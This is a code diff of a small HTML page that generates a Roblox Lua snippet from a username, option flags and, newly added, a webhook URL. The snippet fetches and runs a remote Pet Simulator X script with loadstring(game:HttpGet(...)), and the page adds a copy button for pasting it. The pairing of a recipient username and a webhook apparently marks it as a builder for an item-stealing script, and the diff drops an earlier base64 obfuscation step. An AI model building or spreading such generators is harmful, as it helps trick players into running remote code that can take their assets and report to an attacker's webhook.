@@ -4,13 +4,16 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Coen On Top</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
 <style>
   body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
   .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
   .input-field, .checkbox-group, button { margin: 10px 0; }
   button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
   button:hover { background-color: #0056b3; }
-  #output { text-align: left; }
+  #output { text-align: left; white-space: pre-wrap; }
+  textarea { width: 100%; height: 150px; }
 </style>
 </head>
 <body>
@@ -28,9 +31,13 @@
       <input type="checkbox" id="farmui" name="farmui">
       <label for="farmui">Farmui</label>
     </div>
+    <div class="input-field">
+      <label for="webhook">Webhook URL:</label>
+      <input type="text" id="webhook" name="webhook">
+    </div>
     <button onclick="generateOutput()">Generate</button>
-    <pre id="output"></pre>
-
+    <textarea id="output"></textarea>
+    <button onclick="copyToClipboard()">Copy to Clipboard</button>
   </div>
 
   <script>
@@ -38,22 +45,20 @@
       var username = document.getElementById("username").value;
       var loadingscreen = document.getElementById("loadingscreen").checked;
       var farmui = document.getElementById("farmui").checked;
-      var outputString = 'Username = "' + username + '"<br>' +
-                         'loadingscreen = ' + loadingscreen + ' <br>' +
-                         'farmui = ' + farmui + '<br>' +
-                         'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
-      document.getElementById("output").innerHTML = outputString;
-    }
-    function generateObfuscatedOutput() {
-      var username = document.getElementById("username").value;
-      var loadingscreen = document.getElementById("loadingscreen").checked;
-      var farmui = document.getElementById("farmui").checked;
+      var webhook = document.getElementById("webhook").value;
       var outputString = 'Username = "' + username + '"\\n' +
                          'loadingscreen = ' + loadingscreen + ' \\n' +
                          'farmui = ' + farmui + '\\n' +
+                         'webhook = "' + webhook + '"\\n' +
                          'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
-      var encodedString = btoa(outputString); // Base64 encode
-      document.getElementById("obfuscatedOutput").innerText = encodedString;
+      document.getElementById("output").value = outputString;
+      hljs.highlightAll();
+    }
+
+    function copyToClipboard() {
+      var copyText = document.getElementById("output");
+      copyText.select();
+      document.execCommand("copy");
     }
   </script>
 </body>
